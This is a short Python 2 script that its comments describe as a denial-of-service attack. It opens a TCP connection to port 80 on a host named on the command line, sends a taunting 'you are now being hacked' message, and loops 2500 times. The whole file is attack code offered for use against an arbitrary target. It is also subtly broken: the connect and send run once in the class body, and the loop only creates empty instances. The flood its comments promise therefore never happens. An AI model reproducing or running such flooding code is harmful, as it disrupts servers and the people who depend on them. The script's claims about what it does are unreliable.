import socket
import os
import sys

print "[]Now connecting to "+sys.argv[1]

#Implementation of a simple Denial-of-Service attack using the socket,os and sys modules
class hackattack():
    HacA=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    message="You are now being hacked, hope you're having a good day..."
    HacA.connect((sys.argv[1],80))
    print "Now attacking "+sys.argv[1]
    print "injecting ..."
    HacA.send(message)
    HacA.close()

for y in range(1,2500):
    hackattack()